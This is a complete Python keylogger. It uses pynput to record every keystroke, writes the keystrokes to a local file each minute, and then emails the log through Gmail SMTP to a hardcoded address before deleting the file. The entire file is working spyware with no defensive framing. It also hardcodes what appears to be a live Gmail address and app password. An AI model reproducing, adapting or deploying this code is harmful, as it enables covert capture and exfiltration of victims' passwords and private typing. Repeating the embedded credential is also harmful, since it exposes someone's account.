import smtplib
import time
from pynput.keyboard import Listener, Key
from threading import Timer
import os

keystrokes = []
LOG_INTERVAL = 60  # Log every 60 seconds

def process_key_press(key): 
    global keystrokes
    try:
        keystrokes.append(str(key))   # Capture normal characters
    except Exception as e:
        print(f"Error processing key: {e}")

def write_to_file():
    global keystrokes
    if keystrokes:
        with open("keystrokes.txt", "a") as log_file:
            log_file.write("".join(keystrokes) + "\n")
        keystrokes = []  # Clear stored keystrokes after writing
    Timer(LOG_INTERVAL, write_to_file).start()  # Schedule next write


def send_email():
    sender_email = "ashleighmcln@gmail.com"
    receiver_email = "ashleighmcln@gmail.com"
    password = "hwgj qweh ujhf ycew"  # App password

    message = "No keystrokes available yet"

    if os.path.exists("keystrokes.txt"):
        with open("keystrokes.txt", "r") as log_file:
            message = f"Subject: Keylog Report\n\n{log_file.read()}"
        os.remove("keystrokes.txt")  # Delete log file after sending

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

    Timer(LOG_INTERVAL, send_email).start()  # Schedule next email

with Listener(on_press=process_key_press) as listener:
    write_to_file()  # Start logging process
    send_email()  # Start email sending process
    listener.join()